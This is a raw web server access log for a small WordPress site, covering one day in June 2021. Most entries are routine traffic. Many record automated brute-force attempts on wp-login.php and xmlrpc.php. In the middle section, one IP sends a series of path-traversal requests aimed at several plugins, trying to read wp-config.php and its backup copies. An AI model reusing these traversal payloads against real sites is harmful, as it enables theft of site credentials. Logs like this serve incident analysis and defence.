178.128.180.162 - - [28/Jun/2021:10:25:09 -0400] "POST /xmlrpc.php HTTP/1.1" 200 5094 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
34.220.194.66 - - [28/Jun/2021:10:36:11 -0400] "GET / HTTP/1.1" 301 524 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
204.48.19.85 - - [28/Jun/2021:10:36:18 -0400] "POST /wp-cron.php?doing_wp_cron=1624890978.6633958816528320312500 HTTP/1.1" 200 5389 "https://bubandcompany.com/wp-cron.php?doing_wp_cron=1624890978.6633958816528320312500" "WordPress/5.7.2; https://bubandcompany.com"
34.220.194.66 - - [28/Jun/2021:10:36:17 -0400] "GET / HTTP/1.1" 200 6248 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
167.71.218.191 - - [28/Jun/2021:10:38:59 -0400] "GET /wp-login.php HTTP/1.1" 200 9234 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
167.71.218.191 - - [28/Jun/2021:10:39:01 -0400] "POST /wp-login.php HTTP/1.1" 200 9234 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
204.48.19.85 - - [28/Jun/2021:10:39:03 -0400] "POST /wp-cron.php?doing_wp_cron=1624891143.8038411140441894531250 HTTP/1.1" 200 5389 "https://bubandcompany.com/wp-cron.php?doing_wp_cron=1624891143.8038411140441894531250" "WordPress/5.7.2; https://bubandcompany.com"
167.71.218.191 - - [28/Jun/2021:10:39:03 -0400] "POST /xmlrpc.php HTTP/1.1" 200 5093 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
54.212.58.153 - - [28/Jun/2021:10:42:09 -0400] "GET / HTTP/1.1" 301 524 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
204.48.19.85 - - [28/Jun/2021:10:42:17 -0400] "POST /wp-cron.php?doing_wp_cron=1624891336.9930179119110107421875 HTTP/1.1" 200 5389 "https://bubandcompany.com/wp-cron.php?doing_wp_cron=1624891336.9930179119110107421875" "WordPress/5.7.2; https://bubandcompany.com"
54.212.58.153 - - [28/Jun/2021:10:42:16 -0400] "GET / HTTP/1.1" 200 6248 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
34.211.91.28 - - [28/Jun/2021:10:42:57 -0400] "GET /favicon.ico HTTP/1.1" 301 546 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
34.211.91.28 - - [28/Jun/2021:10:43:01 -0400] "GET / HTTP/1.1" 301 524 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
34.210.67.172 - - [28/Jun/2021:10:45:14 -0400] "GET / HTTP/1.1" 301 580 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36"
204.48.19.85 - - [28/Jun/2021:10:45:15 -0400] "POST /wp-cron.php?doing_wp_cron=1624891515.8431870937347412109375 HTTP/1.1" 200 5389 "https://bubandcompany.com/wp-cron.php?doing_wp_cron=1624891515.8431870937347412109375" "WordPress/5.7.2; https://bubandcompany.com"
34.210.67.172 - - [28/Jun/2021:10:45:14 -0400] "GET / HTTP/1.1" 200 6319 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36"
202.189.180.66 - - [28/Jun/2021:10:48:26 -0400] "POST /wp-login.php HTTP/1.1" 200 9937 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36"
204.48.19.85 - - [28/Jun/2021:10:51:06 -0400] "POST /wp-cron.php?doing_wp_cron=1624891866.0334448814392089843750 HTTP/1.1" 200 5389 "https://bubandcompany.com/wp-cron.php?doing_wp_cron=1624891866.0334448814392089843750" "WordPress/5.7.2; https://bubandcompany.com"
54.202.228.76 - - [28/Jun/2021:10:51:05 -0400] "GET / HTTP/1.1" 200 5833 "-" "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/68.0.3440.106 Safari/537.36"
54.202.228.76 - - [28/Jun/2021:10:51:07 -0400] "GET /wp-content/plugins/under-construction-page/themes/css/bootstrap.min.css?v=3.88 HTTP/1.1" 200 20188 "https://bubandcompany.com/" "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/68.0.3440.106 Safari/537.36"
54.202.228.76 - - [28/Jun/2021:10:51:07 -0400] "GET /wp-content/plugins/under-construction-page/themes/mad_designer/style.css?v=3.88 HTTP/1.1" 200 1216 "https://bubandcompany.com/" "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/68.0.3440.106 Safari/537.36"
54.202.228.76 - - [28/Jun/2021:10:51:07 -0400] "GET /wp-content/plugins/under-construction-page/themes/css/common.css?v=3.88 HTTP/1.1" 200 953 "https://bubandcompany.com/" "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/68.0.3440.106 Safari/537.36"
54.202.228.76 - - [28/Jun/2021:10:51:07 -0400] "GET /wp-content/plugins/under-construction-page/themes/css/font-awesome.min.css?v=3.88 HTTP/1.1" 200 7453 "https://bubandcompany.com/" "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/68.0.3440.106 Safari/537.36"
54.202.228.76 - - [28/Jun/2021:10:51:07 -0400] "GET /wp-content/plugins/under-construction-page/themes/fonts/fontawesome-webfont.woff2?v=4.7.0 HTTP/1.1" 200 77607 "https://bubandcompany.com/wp-content/plugins/under-construction-page/themes/css/font-awesome.min.css?v=3.88" "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/68.0.3440.106 Safari/537.36"
54.202.228.76 - - [28/Jun/2021:10:51:07 -0400] "GET /wp-content/plugins/under-construction-page/themes/mad_designer/mad-designer.png HTTP/1.1" 200 162356 "https://bubandcompany.com/" "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/68.0.3440.106 Safari/537.36"
51.79.156.198 - - [28/Jun/2021:10:52:35 -0400] "GET /wp-login.php HTTP/1.1" 200 9234 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
51.79.156.198 - - [28/Jun/2021:10:52:37 -0400] "POST /wp-login.php HTTP/1.1" 200 9234 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
204.48.19.85 - - [28/Jun/2021:10:52:39 -0400] "POST /wp-cron.php?doing_wp_cron=1624891959.5699470043182373046875 HTTP/1.1" 200 5389 "https://bubandcompany.com/wp-cron.php?doing_wp_cron=1624891959.5699470043182373046875" "WordPress/5.7.2; https://bubandcompany.com"
51.79.156.198 - - [28/Jun/2021:10:52:38 -0400] "POST /xmlrpc.php HTTP/1.1" 200 5093 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
51.38.42.39 - - [28/Jun/2021:11:07:23 -0400] "GET /wp-login.php HTTP/1.1" 200 9231 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
51.38.42.39 - - [28/Jun/2021:11:07:24 -0400] "POST /wp-login.php HTTP/1.1" 200 9231 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
204.48.19.85 - - [28/Jun/2021:11:07:26 -0400] "POST /wp-cron.php?doing_wp_cron=1624892846.0285379886627197265625 HTTP/1.1" 200 5389 "https://bubandcompany.com/wp-cron.php?doing_wp_cron=1624892846.0285379886627197265625" "WordPress/5.7.2; https://bubandcompany.com"
51.38.42.39 - - [28/Jun/2021:11:07:25 -0400] "POST /xmlrpc.php HTTP/1.1" 200 5091 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
5.253.61.250 - - [28/Jun/2021:11:19:44 -0400] "POST /wp-login.php HTTP/1.1" 200 9936 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36"
3.143.118.48 - - [28/Jun/2021:11:22:39 -0400] "GET /wp-login.php HTTP/1.1" 200 9231 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
3.143.118.48 - - [28/Jun/2021:11:22:41 -0400] "POST /wp-login.php HTTP/1.1" 200 9231 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
204.48.19.85 - - [28/Jun/2021:11:22:46 -0400] "POST /wp-cron.php?doing_wp_cron=1624893766.6834070682525634765625 HTTP/1.1" 200 5389 "https://bubandcompany.com/wp-cron.php?doing_wp_cron=1624893766.6834070682525634765625" "WordPress/5.7.2; https://bubandcompany.com"
3.143.118.48 - - [28/Jun/2021:11:22:45 -0400] "POST /xmlrpc.php HTTP/1.1" 200 5091 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
47.90.42.101 - - [28/Jun/2021:11:23:58 -0400] "GET /wp-plugins.php HTTP/1.1" 301 552 "http://simplesite.com" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.99 Safari/533.4"
54.36.149.66 - - [28/Jun/2021:11:35:22 -0400] "GET /robots.txt HTTP/1.1" 404 444 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
204.48.19.85 - - [28/Jun/2021:11:35:24 -0400] "POST /wp-cron.php?doing_wp_cron=1624894524.6056139469146728515625 HTTP/1.1" 301 661 "http://bubandcompany.com/wp-cron.php?doing_wp_cron=1624894524.6056139469146728515625" "WordPress/5.7.2; https://bubandcompany.com"
54.36.148.7 - - [28/Jun/2021:11:35:23 -0400] "GET / HTTP/1.1" 200 1040 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
128.199.47.180 - - [28/Jun/2021:11:36:48 -0400] "GET /wp-login.php HTTP/1.1" 200 9235 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
128.199.47.180 - - [28/Jun/2021:11:36:49 -0400] "POST /wp-login.php HTTP/1.1" 200 9235 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
204.48.19.85 - - [28/Jun/2021:11:36:51 -0400] "POST /wp-cron.php?doing_wp_cron=1624894611.0543119907379150390625 HTTP/1.1" 200 5389 "https://bubandcompany.com/wp-cron.php?doing_wp_cron=1624894611.0543119907379150390625" "WordPress/5.7.2; https://bubandcompany.com"
128.199.47.180 - - [28/Jun/2021:11:36:50 -0400] "POST /xmlrpc.php HTTP/1.1" 200 5094 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
162.214.193.48 - - [28/Jun/2021:11:52:14 -0400] "GET /wp-login.php HTTP/1.1" 200 9234 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
162.214.193.48 - - [28/Jun/2021:11:52:15 -0400] "POST /wp-login.php HTTP/1.1" 200 9234 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
204.48.19.85 - - [28/Jun/2021:11:52:17 -0400] "POST /wp-cron.php?doing_wp_cron=1624895537.4201920032501220703125 HTTP/1.1" 200 5389 "https://bubandcompany.com/wp-cron.php?doing_wp_cron=1624895537.4201920032501220703125" "WordPress/5.7.2; https://bubandcompany.com"
162.214.193.48 - - [28/Jun/2021:11:52:16 -0400] "POST /xmlrpc.php HTTP/1.1" 200 5094 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
165.227.131.69 - - [28/Jun/2021:12:33:12 -0400] "POST /wp-login.php HTTP/1.1" 200 9937 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36"
54.36.160.184 - - [28/Jun/2021:12:57:25 -0400] "POST /wp-login.php HTTP/1.1" 200 9937 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36"
42.200.180.31 - - [28/Jun/2021:13:02:04 -0400] "POST /wp-login.php HTTP/1.1" 200 9936 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36"
5.253.61.250 - - [28/Jun/2021:13:36:40 -0400] "POST /wp-login.php HTTP/1.1" 200 9936 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36"
209.244.159.152 - - [28/Jun/2021:14:00:07 -0400] "POST /wp-login.php HTTP/1.1" 200 9938 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36"
91.121.175.24 - - [28/Jun/2021:14:03:34 -0400] "GET /wp-config.php.bak HTTP/1.1" 301 558 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
91.121.175.24 - - [28/Jun/2021:14:03:35 -0400] "GET /wp-config.php.bak HTTP/1.1" 404 4981 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
91.121.175.24 - - [28/Jun/2021:14:03:47 -0400] "GET /wp-config.php HTTP/1.1" 301 550 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
204.48.19.85 - - [28/Jun/2021:14:03:48 -0400] "POST /wp-cron.php?doing_wp_cron=1624903428.5749239921569824218750 HTTP/1.1" 200 5389 "https://bubandcompany.com/wp-cron.php?doing_wp_cron=1624903428.5749239921569824218750" "WordPress/5.7.2; https://bubandcompany.com"
91.121.175.24 - - [28/Jun/2021:14:03:47 -0400] "GET /wp-config.php HTTP/1.1" 200 297 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
91.121.175.24 - - [28/Jun/2021:14:03:54 -0400] "GET /wp-config.php.orig HTTP/1.1" 301 560 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
91.121.175.24 - - [28/Jun/2021:14:03:55 -0400] "GET /wp-config.php.orig HTTP/1.1" 404 591 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
91.121.175.24 - - [28/Jun/2021:14:04:07 -0400] "GET /wp-config.orig HTTP/1.1" 301 552 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
91.121.175.24 - - [28/Jun/2021:14:04:07 -0400] "GET /wp-config.orig HTTP/1.1" 404 591 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
91.121.175.24 - - [28/Jun/2021:14:04:13 -0400] "GET /wp-config.php.bkp HTTP/1.1" 301 558 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
91.121.175.24 - - [28/Jun/2021:14:04:14 -0400] "GET /wp-config.php.bkp HTTP/1.1" 404 591 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
91.121.175.24 - - [28/Jun/2021:14:04:26 -0400] "GET /wp-config.bkp HTTP/1.1" 301 550 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
91.121.175.24 - - [28/Jun/2021:14:04:26 -0400] "GET /wp-config.bkp HTTP/1.1" 404 591 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
91.121.175.24 - - [28/Jun/2021:14:04:31 -0400] "GET /wp-config.php.backup HTTP/1.1" 301 564 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
91.121.175.24 - - [28/Jun/2021:14:04:31 -0400] "GET /wp-config.php.backup HTTP/1.1" 404 462 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
91.121.175.24 - - [28/Jun/2021:14:04:36 -0400] "GET /wp-config.backup HTTP/1.1" 301 556 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
91.121.175.24 - - [28/Jun/2021:14:04:36 -0400] "GET /wp-config.backup HTTP/1.1" 404 591 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
91.121.175.24 - - [28/Jun/2021:14:04:47 -0400] "GET /wp-config.txt HTTP/1.1" 301 550 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
91.121.175.24 - - [28/Jun/2021:14:04:47 -0400] "GET /wp-config.txt HTTP/1.1" 404 591 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
91.121.175.24 - - [28/Jun/2021:14:04:54 -0400] "GET /wp-config.original HTTP/1.1" 301 560 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
91.121.175.24 - - [28/Jun/2021:14:04:54 -0400] "GET /wp-config.original HTTP/1.1" 404 591 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
91.121.175.24 - - [28/Jun/2021:14:05:06 -0400] "GET /wp-config.php.original HTTP/1.1" 301 568 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
91.121.175.24 - - [28/Jun/2021:14:05:06 -0400] "GET /wp-config.php.original HTTP/1.1" 404 591 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
91.121.175.24 - - [28/Jun/2021:14:05:12 -0400] "GET /wp-admin/admin-post.php?alg_wc_pif_download_file=..%2F..%2F..%2F..%2F..%2Fwp-config.php HTTP/1.1" 301 698 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
204.48.19.85 - - [28/Jun/2021:14:05:13 -0400] "POST /wp-cron.php?doing_wp_cron=1624903513.7530469894409179687500 HTTP/1.1" 200 5389 "https://bubandcompany.com/wp-cron.php?doing_wp_cron=1624903513.7530469894409179687500" "WordPress/5.7.2; https://bubandcompany.com"
91.121.175.24 - - [28/Jun/2021:14:05:12 -0400] "GET /wp-admin/admin-post.php?alg_wc_pif_download_file=..%2F..%2F..%2F..%2F..%2Fwp-config.php HTTP/1.1" 200 527 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
91.121.175.24 - - [28/Jun/2021:14:05:25 -0400] "GET /wp-admin/admin-post.php?alg_wc_pif_download_file=..%2Fwp-config.php HTTP/1.1" 301 658 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
204.48.19.85 - - [28/Jun/2021:14:05:26 -0400] "POST /wp-cron.php?doing_wp_cron=1624903526.4582610130310058593750 HTTP/1.1" 200 5389 "https://bubandcompany.com/wp-cron.php?doing_wp_cron=1624903526.4582610130310058593750" "WordPress/5.7.2; https://bubandcompany.com"
91.121.175.24 - - [28/Jun/2021:14:05:25 -0400] "GET /wp-admin/admin-post.php?alg_wc_pif_download_file=..%2Fwp-config.php HTTP/1.1" 200 527 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
91.121.175.24 - - [28/Jun/2021:14:05:33 -0400] "GET /wp-admin/admin-ajax.php?action=duplicator_download&file=..%2Fwp-config.php HTTP/1.1" 301 676 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
91.121.175.24 - - [28/Jun/2021:14:05:33 -0400] "GET /wp-admin/admin-ajax.php?action=duplicator_download&file=..%2Fwp-config.php HTTP/1.1" 400 554 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
91.121.175.24 - - [28/Jun/2021:14:05:45 -0400] "GET /wp-admin/admin-ajax.php?action=revslider_show_image&img=..%2Fwp-config.php HTTP/1.1" 301 676 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
204.48.19.85 - - [28/Jun/2021:14:05:47 -0400] "POST /wp-cron.php?doing_wp_cron=1624903547.2589559555053710937500 HTTP/1.1" 200 5389 "https://bubandcompany.com/wp-cron.php?doing_wp_cron=1624903547.2589559555053710937500" "WordPress/5.7.2; https://bubandcompany.com"
91.121.175.24 - - [28/Jun/2021:14:05:46 -0400] "GET /wp-admin/admin-ajax.php?action=revslider_show_image&img=..%2Fwp-config.php HTTP/1.1" 400 4944 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
91.121.175.24 - - [28/Jun/2021:14:05:53 -0400] "GET /wp-content/plugins/media-library-assistant/includes/mla-file-downloader.php?mla_download_type=text%2Fhtml&mla_download_file=..%2F..%2F..%2F..%2Fwp-config.php HTTP/1.1" 301 842 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
91.121.175.24 - - [28/Jun/2021:14:05:53 -0400] "GET /wp-content/plugins/media-library-assistant/includes/mla-file-downloader.php?mla_download_type=text%2Fhtml&mla_download_file=..%2F..%2F..%2F..%2Fwp-config.php HTTP/1.1" 404 4981 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
91.121.175.24 - - [28/Jun/2021:14:06:05 -0400] "GET /wp-content/plugins/wechat-broadcast/wechat/Image.php?url=..%2F..%2F..%2F..%2Fwp-config.php HTTP/1.1" 301 704 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
91.121.175.24 - - [28/Jun/2021:14:06:06 -0400] "GET /wp-content/plugins/wechat-broadcast/wechat/Image.php?url=..%2F..%2F..%2F..%2Fwp-config.php HTTP/1.1" 404 591 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
91.121.175.24 - - [28/Jun/2021:14:06:12 -0400] "GET /wp-admin/admin.php?page=miwoftp&option=com_miwoftp&action=download&dir=%2F&item=..%2Fwp-config.php&order=name&srt=yes HTTP/1.1" 301 782 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
91.121.175.24 - - [28/Jun/2021:14:06:12 -0400] "GET /wp-admin/admin.php?page=miwoftp&option=com_miwoftp&action=download&dir=%2F&item=..%2Fwp-config.php&order=name&srt=yes HTTP/1.1" 302 676 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
91.121.175.24 - - [28/Jun/2021:14:06:13 -0400] "GET /wp-login.php?redirect_to=https%3A%2F%2Fbubandcompany.com%2Fwp-admin%2Fadmin.php%3Fpage%3Dmiwoftp%26option%3Dcom_miwoftp%26action%3Ddownload%26dir%3D%252F%26item%3D..%252Fwp-config.php%26order%3Dname%26srt%3Dyes&reauth=1 HTTP/1.1" 200 4961 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
91.121.175.24 - - [28/Jun/2021:14:06:26 -0400] "GET /wp-content/plugins/site-import/admin/page.php?url=..%2F..%2F..%2F..%2Fwp-config.php HTTP/1.1" 301 690 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
91.121.175.24 - - [28/Jun/2021:14:06:26 -0400] "GET /wp-content/plugins/site-import/admin/page.php?url=..%2F..%2F..%2F..%2Fwp-config.php HTTP/1.1" 404 591 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
34.87.224.45 - - [28/Jun/2021:14:08:28 -0400] "POST /wp-login.php HTTP/1.1" 200 9936 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36"
45.82.71.196 - - [28/Jun/2021:14:34:22 -0400] "GET / HTTP/1.1" 301 524 "-" "python-urllib3/1.26.3"
204.48.19.85 - - [28/Jun/2021:14:34:35 -0400] "POST /wp-cron.php?doing_wp_cron=1624905275.4135880470275878906250 HTTP/1.1" 200 5389 "https://bubandcompany.com/wp-cron.php?doing_wp_cron=1624905275.4135880470275878906250" "WordPress/5.7.2; https://bubandcompany.com"
45.82.71.196 - - [28/Jun/2021:14:34:34 -0400] "GET / HTTP/1.1" 200 7795 "-" "python-urllib3/1.26.3"
45.207.65.42 - - [28/Jun/2021:14:46:43 -0400] "POST /wp-login.php HTTP/1.1" 200 9936 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36"
204.48.19.85 - - [28/Jun/2021:14:57:33 -0400] "POST /wp-cron.php?doing_wp_cron=1624906653.7757010459899902343750 HTTP/1.1" 200 5389 "https://bubandcompany.com/wp-cron.php?doing_wp_cron=1624906653.7757010459899902343750" "WordPress/5.7.2; https://bubandcompany.com"
54.36.148.252 - - [28/Jun/2021:14:57:32 -0400] "GET / HTTP/1.1" 200 6263 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
134.209.127.203 - - [28/Jun/2021:15:02:10 -0400] "POST /wp-login.php HTTP/1.1" 200 9939 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
121.41.118.55 - - [28/Jun/2021:15:07:01 -0400] "GET /ini.php HTTP/1.1" 301 538 "http://simplesite.com" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.99 Safari/533.4"
121.41.118.55 - - [28/Jun/2021:15:07:03 -0400] "GET /ini.php HTTP/1.1" 404 4952 "http://bubandcompany.com/ini.php" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.99 Safari/533.4"
204.48.19.85 - - [28/Jun/2021:15:51:53 -0400] "POST /wp-cron.php?doing_wp_cron=1624909913.8325181007385253906250 HTTP/1.1" 200 5389 "https://bubandcompany.com/wp-cron.php?doing_wp_cron=1624909913.8325181007385253906250" "WordPress/5.7.2; https://bubandcompany.com"
13.58.68.167 - - [28/Jun/2021:15:51:52 -0400] "GET /index.php/contact/ HTTP/1.1" 200 5797 "-" "Mozilla/5.0 (X11; CrOS x86_64 10323.67.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.209 Safari/537.36"
13.58.68.167 - - [28/Jun/2021:15:51:54 -0400] "GET /wp-login.php HTTP/1.1" 200 7823 "https://bubandcompany.com/index.php/contact/" "Mozilla/5.0 (X11; CrOS x86_64 10323.67.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.209 Safari/537.36"
13.58.68.167 - - [28/Jun/2021:15:51:59 -0400] "GET /wp-content/plugins/under-construction-page/themes/mad_designer/style.css?v=3.88 HTTP/1.1" 200 5798 "https://bubandcompany.com/index.php/contact/" "Mozilla/5.0 (X11; CrOS x86_64 10323.67.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.209 Safari/537.36"
